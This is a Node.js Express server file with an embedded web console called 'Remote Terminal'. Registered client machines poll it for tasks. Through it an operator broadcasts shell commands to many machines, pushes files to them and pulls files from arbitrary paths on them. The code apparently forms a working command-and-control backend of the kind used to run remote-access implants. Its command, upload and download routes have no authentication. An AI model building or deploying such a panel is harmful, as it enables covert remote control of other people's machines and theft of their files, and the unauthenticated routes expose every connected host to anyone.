const express = require('express');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const app = express();

// ---------- Setup ----------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
const upload = multer({ dest: 'uploads/' });
if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');
if (!fs.existsSync('downloads')) fs.mkdirSync('downloads');

// ---------- State ----------
const clients = new Map();
const clientHistory = new Map();
let latestCommand = { id: 0, cmd: '' };
const selectedInclude = new Set();
const selectedExclude = new Set();

// ---------- Constants ----------
const DISCONNECT_THRESHOLD = 10000;

// ---------- Helper ----------
function getClientStatus(clientId) {
  const client = clients.get(clientId);
  if (!client || !client.lastSeen) return 'unknown';
  return Date.now() - client.lastSeen > DISCONNECT_THRESHOLD ? 'disconnected' : 'connected';
}

/**
 * Ensure a client exists for the given ID.
 * If it doesn't, create it with default state.
 */
function ensureClient(clientId) {
  if (!clientId) return null;
  if (clients.has(clientId)) {
    return clients.get(clientId);
  }
  // Auto-register this client
  const newClient = {
    cwd: '/',
    env: {},
    tasks: [],
    lastTaskId: 0,
    connected: true,
    pendingDownload: null,
    lastSeen: Date.now(),
    registered: true   // flag to know it was auto-registered
  };
  clients.set(clientId, newClient);
  clientHistory.set(clientId, []);
  console.log(`[AUTO-REGISTER] Client ${clientId} re-registered after restart`);
  return newClient;
}

// ---------- Embedded HTML (unchanged) ----------
const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Remote Terminal</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body, html { height: 100%; background: #121212; color: #eee; font-family: 'Courier New', monospace; }
    #terminal { padding: 15px; height: calc(95vh - 40px); overflow-y: auto; white-space: pre-wrap; font-size: 13px; line-height: 1.4; }
    #inputLine { position: fixed; bottom: 0; width: 100%; background: #1a1a1a; padding: 8px 15px; border-top: 1px solid #333; }
    #cmd { width: 100%; background: transparent; border: none; color: #0f0; font-family: 'Courier New', monospace; font-size: 13px; }
    #cmd:focus { outline: none; }
    .output { margin: 2px 0; display: flex; gap: 8px; align-items: flex-start; }
    .error { color: #f55; }
    .system { color: #3af; }
    .command { color: #5f5; }
    .lineCheckbox { margin-top: 2px; cursor: pointer; }
    .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; flex-shrink: 0; }
    .status-connected { background: #0f0; }
    .status-disconnected { background: #f55; }
    ::-webkit-scrollbar { width: 8px; }
    ::-webkit-scrollbar-track { background: #1a1a1a; }
    ::-webkit-scrollbar-thumb { background: #444; border-radius: 4px; }
    ::-webkit-scrollbar-thumb:hover { background: #666; }
    #controlBar { position: fixed; right: 12px; bottom: 72px; background: #1a1a1a; border: 1px solid #333; padding: 10px; border-radius: 6px; display: flex; flex-direction: column; gap: 6px; z-index: 1000; color: #ddd; font-size: 12px; min-width: 280px; max-width: 360px; }
    #selectedList { max-width: 340px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; word-break: break-all; }
    button { background: #2a2a2a; color: #eee; border: 1px solid #333; padding: 6px 8px; border-radius: 4px; cursor: pointer; font-family: 'Courier New', monospace; font-size: 11px; }
    button:hover { background: #3a3a3a; }
    .modeToggle { display: flex; gap: 4px; align-items: center; flex-wrap: wrap; }
    .modeToggle label { display: flex; align-items: center; gap: 4px; cursor: pointer; }
    .modeToggle input[type="radio"] { accent-color: #0f0; cursor: pointer; }
    .modeLabel { font-weight: bold; }
    .mode-none { color: #aaa; }
    .mode-include { color: #5f5; }
    .mode-exclude { color: #f55; }
    .mode-indicator { padding: 2px 6px; border-radius: 3px; font-size: 10px; font-weight: bold; }
    .mode-indicator.none { background: #aaa2; color: #aaa; border: 1px solid #aaa8; }
    .mode-indicator.include { background: #0f02; color: #5f5; border: 1px solid #0f08; }
    .mode-indicator.exclude { background: #f002; color: #f55; border: 1px solid #f008; }
    .selectedInfo { color: #888; font-size: 10px; }
    .line-highlight { background: #ffffff08; }
    #fileSection { border-bottom: 1px solid #333; padding-bottom: 6px; margin-bottom: 2px; }
    .file-label { color: #aaa; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 3px; }
    .file-row { display: flex; gap: 4px; align-items: center; margin-bottom: 4px; }
    .file-row input[type="file"] { font-family: 'Courier New', monospace; font-size: 10px; color: #ddd; width: 100%; }
    .file-row input[type="file"]::-webkit-file-upload-button { background: #2a2a2a; color: #eee; border: 1px solid #333; padding: 4px 6px; border-radius: 4px; cursor: pointer; font-family: 'Courier New', monospace; font-size: 10px; }
    .file-row input[type="file"]::-webkit-file-upload-button:hover { background: #3a3a3a; }
    .file-row input[type="text"] { flex: 1; background: #0a0a0a; border: 1px solid #333; color: #eee; padding: 4px 6px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 11px; }
    .file-btn { background: #1a3a1a; border: 1px solid #0f08; }
    .file-btn:hover { background: #2a5a2a; }
    .file-btn-small { padding: 4px 6px; font-size: 10px; }
    #fileProgress { position: fixed; left: 50%; top: 50%; transform: translate(-50%, -50%); background: #1a1a1a; border: 1px solid #0f08; padding: 20px; border-radius: 8px; display: none; z-index: 2000; text-align: center; min-width: 320px; }
    #fileProgress .progress-label { margin-bottom: 8px; font-size: 13px; }
    #fileProgress .progress-bar-bg { width: 100%; height: 14px; background: #2a2a2a; border-radius: 7px; overflow: hidden; }
    #fileProgress .progress-bar-fill { height: 100%; width: 0%; background: #0f0; border-radius: 7px; transition: width 0.3s; }
    #fileProgress .progress-pct { margin-top: 6px; font-size: 11px; color: #aaa; }
  </style>
</head>
<body>
  <div id="terminal"></div>
  <div id="controlBar">
    <div id="fileSection">
      <div class="file-label">Upload File to Client(s)</div>
      <br>
      <div class="file-row"><input type="file" id="uploadFileInput" /></div>
      <br>
      <div class="file-row"><button id="uploadBtn" class="file-btn file-btn-small" style="width:100%">Upload</button></div>
      <br>
      <div class="file-label" style="margin-top:4px">Download File from Client</div>
      <br>
      <div class="file-row"><input type="text" id="downloadPath" placeholder="remote file path..." /><button id="downloadBtn" class="file-btn file-btn-small">Get</button></div>
      <br>
    </div>
    <div class="modeToggle">
      <span class="modeLabel">Mode:</span>
      <label><input type="radio" name="selMode" value="none" checked /> <span class="mode-none">None</span></label>
      <label><input type="radio" name="selMode" value="include" /> <span class="mode-include">Include</span></label>
      <label><input type="radio" name="selMode" value="exclude" /> <span class="mode-exclude">Exclude</span></label>
      <span id="modeBadge" class="mode-indicator none">NONE</span>
    </div>
    <div id="selectedList" class="selectedInfo">All clients targeted</div>
    <button id="clearBtn">Clear Selections</button>
  </div>
  <div id="fileProgress">
    <div class="progress-label" id="progressLabel">Transferring...</div>
    <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill"></div></div>
    <div class="progress-pct" id="progressPct">0%</div>
  </div>
  <div id="inputLine">
    <input type="text" id="cmd" autocomplete="off" spellcheck="false" placeholder="Type command..." autofocus />
  </div>
  <script>
    // ---------- HTTP-based UI with history ----------
    const terminal = document.getElementById('terminal');
    const input = document.getElementById('cmd');
    const selectedUUIDs = new Set();
    const excludedUUIDs = new Set();
    let selectionMode = 'none';
    let commandHistory = [];
    let historyIndex = -1;
    let lastCtrlClickedCheckbox = null;
    // Store all terminal lines as DOM elements
    const terminalLines = [];

    // Radio buttons
    document.querySelectorAll('input[name="selMode"]').forEach(radio => {
      radio.addEventListener('change', (e) => {
        if (e.target.checked) {
          selectionMode = e.target.value;
          const badge = document.getElementById('modeBadge');
          badge.textContent = selectionMode.toUpperCase();
          badge.className = 'mode-indicator ' + selectionMode;
          updateSelectedList();
          document.querySelectorAll('.lineCheckbox').forEach(cb => { cb.disabled = (selectionMode === 'none'); });
        }
      });
    });

    function updateSelectedList() {
      const el = document.getElementById('selectedList');
      if (selectionMode === 'none') {
        el.textContent = 'Mode: None — all clients targeted';
      } else if (selectionMode === 'include') {
        if (selectedUUIDs.size === 0) el.textContent = 'Selected (include): none — command will go nowhere';
        else el.textContent = 'Selected (include): ' + Array.from(selectedUUIDs).join(', ');
      } else {
        if (excludedUUIDs.size === 0) el.textContent = 'Excluded: none — all clients targeted';
        else el.textContent = 'Excluded: ' + Array.from(excludedUUIDs).join(', ');
      }
    }

    function getAllVisibleUUIDs() {
      const uuids = new Set();
      document.querySelectorAll('.lineCheckbox:not(:disabled)').forEach(cb => {
        if (cb.dataset.uuid) uuids.add(cb.dataset.uuid);
      });
      return uuids;
    }

    function getTargetUUIDs() {
      if (selectionMode === 'none') return null;
      else if (selectionMode === 'include') return new Set(selectedUUIDs);
      else {
        const all = getAllVisibleUUIDs();
        excludedUUIDs.forEach(id => all.delete(id));
        return all;
      }
    }

    // Build a line element with checkbox and status dot
    function buildLineElement(client, cls) {
      const wrapper = document.createElement('div');
      wrapper.className = 'output';
      if (cls) wrapper.classList.add(cls);

      // Status dot
      const dot = document.createElement('span');
      dot.className = 'status-dot ' + (client.status === 'connected' ? 'status-connected' : 'status-disconnected');
      wrapper.appendChild(dot);

      // Checkbox
      const checkbox = document.createElement('input');
      checkbox.type = 'checkbox';
      checkbox.className = 'lineCheckbox';
      if (client.id) {
        checkbox.dataset.uuid = client.id;
        checkbox.disabled = (selectionMode === 'none');
        checkbox.addEventListener('change', (e) => {
          const id = e.target.dataset.uuid;
          if (selectionMode === 'include') {
            if (e.target.checked) selectedUUIDs.add(id); else selectedUUIDs.delete(id);
          } else if (selectionMode === 'exclude') {
            if (e.target.checked) excludedUUIDs.add(id); else excludedUUIDs.delete(id);
          }
          updateSelectedList();
        });
        checkbox.addEventListener('click', (e) => {
          if (e.ctrlKey || e.metaKey) {
            e.preventDefault();
            const currentCb = e.target;
            if (lastCtrlClickedCheckbox && lastCtrlClickedCheckbox !== currentCb) {
              const allCheckboxes = Array.from(document.querySelectorAll('.lineCheckbox:not(:disabled)'));
              const startIdx = allCheckboxes.indexOf(lastCtrlClickedCheckbox);
              const endIdx = allCheckboxes.indexOf(currentCb);
              if (startIdx !== -1 && endIdx !== -1) {
                const [lo, hi] = startIdx < endIdx ? [startIdx, endIdx] : [endIdx, startIdx];
                for (let i = lo; i <= hi; i++) {
                  const cb = allCheckboxes[i];
                  const id = cb.dataset.uuid;
                  if (!id) continue;
                  cb.checked = true;
                  if (selectionMode === 'include') selectedUUIDs.add(id);
                  else if (selectionMode === 'exclude') excludedUUIDs.add(id);
                }
                updateSelectedList();
              }
            }
            lastCtrlClickedCheckbox = currentCb;
          } else {
            lastCtrlClickedCheckbox = null;
          }
        });
      } else {
        checkbox.disabled = true;
        checkbox.title = 'No UUID on this line';
      }
      wrapper.appendChild(checkbox);

      // Text content
      const textDiv = document.createElement('div');
      const displayText = '[' + client.id + '] ' + (client.cwd || '/') + ' > ' + (client.output || 'No output');
      textDiv.textContent = displayText;
      wrapper.appendChild(textDiv);

      return wrapper;
    }

    function appendLine(client, cls) {
      const el = buildLineElement(client, cls);
      terminal.appendChild(el);
      terminalLines.push(el);
      terminal.scrollTop = terminal.scrollHeight;
    }

    function showProgress(label, pct) {
      document.getElementById('progressLabel').textContent = label;
      document.getElementById('progressFill').style.width = pct + '%';
      document.getElementById('progressPct').textContent = pct + '%';
      document.getElementById('fileProgress').style.display = 'block';
    }

    function hideProgress() {
      document.getElementById('fileProgress').style.display = 'none';
    }

    // Fetch clients and append new lines (do not clear)
    async function fetchClients() {
      try {
        const res = await fetch('/clients');
        const data = await res.json();
        if (!window.lastKnownOutputs) window.lastKnownOutputs = new Map();

        for (const client of data.clients) {
          const last = window.lastKnownOutputs.get(client.id);
          const current = client.output || '';
          if (last !== current) {
            const cls = client.output && client.output.toLowerCase().includes('error') ? 'error' : '';
            appendLine(client, cls);
            window.lastKnownOutputs.set(client.id, current);
          }
        }
        if (data.clients.length > 0 && data.clients[0].cwd) {
          document.title = 'Remote Terminal - ' + data.clients[0].cwd;
        }
        updateSelectedList();
      } catch (e) {
        console.error('Fetch error:', e);
      }
    }

    async function sendCommand(cmd) {
      const targets = getTargetUUIDs();
      const payload = { cmd: cmd };
      if (targets !== null) payload.targets = Array.from(targets);
      try {
        await fetch('/command', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        const cmdWrapper = document.createElement('div');
        cmdWrapper.className = 'output command';
        const cmdText = document.createElement('div');
        cmdText.textContent = '> ' + cmd;
        cmdWrapper.appendChild(cmdText);
        terminal.appendChild(cmdWrapper);
        terminal.scrollTop = terminal.scrollHeight;
      } catch (e) {
        const errWrapper = document.createElement('div');
        errWrapper.className = 'output error';
        const errText = document.createElement('div');
        errText.textContent = '[Error] Failed to send command';
        errWrapper.appendChild(errText);
        terminal.appendChild(errWrapper);
        terminal.scrollTop = terminal.scrollHeight;
      }
    }

    // Keyboard
    input.addEventListener('keydown', evt => {
      if (evt.key === 'Enter') {
        const val = input.value.trim();
        if (val) {
          sendCommand(val);
          commandHistory.push(val);
          historyIndex = commandHistory.length;
        }
        input.value = '';
        evt.preventDefault();
      } else if (evt.key === 'ArrowUp') {
        evt.preventDefault();
        if (commandHistory.length && historyIndex > 0) {
          historyIndex--;
          input.value = commandHistory[historyIndex];
        }
      } else if (evt.key === 'ArrowDown') {
        evt.preventDefault();
        if (commandHistory.length && historyIndex < commandHistory.length - 1) {
          historyIndex++;
          input.value = commandHistory[historyIndex];
        } else {
          historyIndex = commandHistory.length;
          input.value = '';
        }
      }
    });

    // Upload
    document.getElementById('uploadBtn').addEventListener('click', async () => {
      const fileInput = document.getElementById('uploadFileInput');
      if (!fileInput.files || fileInput.files.length === 0) {
        const errWrapper = document.createElement('div');
        errWrapper.className = 'output error';
        const errText = document.createElement('div');
        errText.textContent = '[System] No file selected for upload';
        errWrapper.appendChild(errText);
        terminal.appendChild(errWrapper);
        terminal.scrollTop = terminal.scrollHeight;
        return;
      }
      const file = fileInput.files[0];
      const targets = getTargetUUIDs();
      const formData = new FormData();
      formData.append('file', file);
      if (targets !== null) formData.append('targets', JSON.stringify(Array.from(targets)));
      try {
        const res = await fetch('/upload', { method: 'POST', body: formData });
        const result = await res.json();
        const msg = result.ok ? '[System] Uploaded ' + file.name + ' to client(s)' : '[System] Upload failed: ' + (result.error || 'unknown error');
        const wrapper = document.createElement('div');
        wrapper.className = 'output system';
        const text = document.createElement('div');
        text.textContent = msg;
        wrapper.appendChild(text);
        terminal.appendChild(wrapper);
        terminal.scrollTop = terminal.scrollHeight;
      } catch (e) {
        const wrapper = document.createElement('div');
        wrapper.className = 'output error';
        const text = document.createElement('div');
        text.textContent = '[System] Upload error: ' + e.message;
        wrapper.appendChild(text);
        terminal.appendChild(wrapper);
        terminal.scrollTop = terminal.scrollHeight;
      }
    });

    // Download
    document.getElementById('downloadBtn').addEventListener('click', async () => {
      const remotePath = document.getElementById('downloadPath').value.trim();
      if (!remotePath) {
        const wrapper = document.createElement('div');
        wrapper.className = 'output error';
        const text = document.createElement('div');
        text.textContent = '[System] No remote path specified for download';
        wrapper.appendChild(text);
        terminal.appendChild(wrapper);
        terminal.scrollTop = terminal.scrollHeight;
        return;
      }
      const targets = getTargetUUIDs();
      const payload = { path: remotePath };
      if (targets !== null) payload.targets = Array.from(targets);
      try {
        const res = await fetch('/download-request', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        const result = await res.json();
        const msg = result.ok ? '[System] Download requested for ' + remotePath : '[System] Download failed: ' + (result.error || 'unknown error');
        const wrapper = document.createElement('div');
        wrapper.className = 'output system';
        const text = document.createElement('div');
        text.textContent = msg;
        wrapper.appendChild(text);
        terminal.appendChild(wrapper);
        terminal.scrollTop = terminal.scrollHeight;
      } catch (e) {
        const wrapper = document.createElement('div');
        wrapper.className = 'output error';
        const text = document.createElement('div');
        text.textContent = '[System] Download error: ' + e.message;
        wrapper.appendChild(text);
        terminal.appendChild(wrapper);
        terminal.scrollTop = terminal.scrollHeight;
      }
    });

    // Clear selections
    document.getElementById('clearBtn').addEventListener('click', () => {
      selectedUUIDs.clear();
      excludedUUIDs.clear();
      document.querySelectorAll('.lineCheckbox').forEach(cb => { cb.checked = false; });
      lastCtrlClickedCheckbox = null;
      updateSelectedList();
    });

    // Init
    document.querySelectorAll('.lineCheckbox').forEach(cb => { cb.disabled = true; });
    updateSelectedList();
    fetchClients();
    setInterval(fetchClients, 2000);
  </script>
</body>
</html>`;

// ---------- Routes ----------
app.get('/', (req, res) => res.send(html));
app.get('/master', (req, res) => res.send(html));

// ---------- API routes ----------

// Register – still generates a new UUID (client may call this on first start)
app.post('/register', (req, res) => {
  const clientId = uuidv4();
  // If client already exists (should not happen with new UUID), we overwrite? Better to ensure it doesn't exist.
  if (!clients.has(clientId)) {
    clients.set(clientId, {
      cwd: '/',
      env: {},
      tasks: [],
      lastTaskId: 0,
      connected: true,
      pendingDownload: null,
      lastSeen: Date.now()
    });
    clientHistory.set(clientId, []);
  }
  res.json({ clientId });
});

// Poll – auto‑register if unknown clientId
app.get('/poll', (req, res) => {
  const clientId = req.query.clientId;
  if (!clientId) {
    return res.status(400).json({ error: 'Missing clientId' });
  }
  const client = ensureClient(clientId);
  if (!client) {
    return res.status(400).json({ error: 'Invalid client' });
  }
  client.lastSeen = Date.now();

  let task = null;
  if (client.tasks && client.tasks.length > 0) {
    task = client.tasks.shift();
  } else if (latestCommand.id > client.lastTaskId) {
    client.lastTaskId = latestCommand.id;
    task = { type: 'command', cmd: latestCommand.cmd, id: latestCommand.id };
  }
  res.json({ task: task || null });
});

// Result – auto‑register if unknown clientId
app.post('/result', (req, res) => {
  const { clientId, taskId, output, fileData } = req.body;
  if (!clientId) {
    return res.status(400).json({ error: 'Missing clientId' });
  }
  const client = ensureClient(clientId);
  if (!client) {
    return res.status(400).json({ error: 'Invalid client' });
  }
  client.lastSeen = Date.now();

  if (taskId && taskId > client.lastTaskId) {
    client.lastTaskId = taskId;
  }
  if (output !== undefined) {
    const history = clientHistory.get(clientId) || [];
    history.push({ timestamp: Date.now(), output });
    if (history.length > 100) history.shift();
    clientHistory.set(clientId, history);
  }
  if (fileData) {
    const filename = 'download_' + Date.now() + '_' + clientId + '.bin';
    const filePath = path.join(__dirname, 'downloads', filename);
    fs.writeFileSync(filePath, Buffer.from(fileData, 'base64'));
    client.pendingDownload = '/downloads/' + filename;
  }
  res.json({ ok: true });
});

// Clients list – includes auto‑registered ones
app.get('/clients', (req, res) => {
  const list = [];
  for (const [id, client] of clients) {
    const history = clientHistory.get(id) || [];
    const lastOutput = history.length > 0 ? history[history.length - 1].output : '';
    const status = getClientStatus(id);
    list.push({
      id,
      output: lastOutput,
      cwd: client.cwd || '/',
      status
    });
  }
  res.json({ clients: list });
});

// Command – targets may include clients that are not yet registered, but we'll just skip them
app.post('/command', (req, res) => {
  const { cmd, targets } = req.body;
  if (!cmd) return res.status(400).json({ error: 'No command' });
  latestCommand.id++;
  latestCommand.cmd = cmd;
  const targetList = (targets && targets.length > 0) ? targets : Array.from(clients.keys());
  for (const clientId of targetList) {
    if (clients.has(clientId)) {
      clients.get(clientId).tasks.push({ type: 'command', cmd, id: latestCommand.id });
    }
  }
  res.json({ ok: true });
});

// Upload – similarly, skip unknown clients
app.post('/upload', upload.single('file'), (req, res) => {
  const file = req.file;
  if (!file) return res.status(400).json({ error: 'No file' });
  const data = fs.readFileSync(file.path);
  const base64 = data.toString('base64');
  fs.unlinkSync(file.path);
  const targets = req.body.targets ? JSON.parse(req.body.targets) : [];
  const targetList = (targets && targets.length > 0) ? targets : Array.from(clients.keys());
  const task = { type: 'upload', filename: file.originalname, data: base64 };
  for (const clientId of targetList) {
    if (clients.has(clientId)) {
      clients.get(clientId).tasks.push(task);
    }
  }
  res.json({ ok: true });
});

// Download request – skip unknown
app.post('/download-request', (req, res) => {
  const { path: remotePath, targets } = req.body;
  if (!remotePath) return res.status(400).json({ error: 'No path' });
  const targetList = (targets && targets.length > 0) ? targets : Array.from(clients.keys());
  const task = { type: 'download', path: remotePath };
  for (const clientId of targetList) {
    if (clients.has(clientId)) {
      clients.get(clientId).tasks.push(task);
    }
  }
  res.json({ ok: true });
});

app.use('/downloads', express.static('downloads'));

// ---------- Catch-all for viewer mode (MUST BE LAST) ----------
app.get('/:uuid', (req, res) => res.send(html));

// ---------- Start ----------
const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
  console.log('HTTP Server running on port ' + PORT);
});
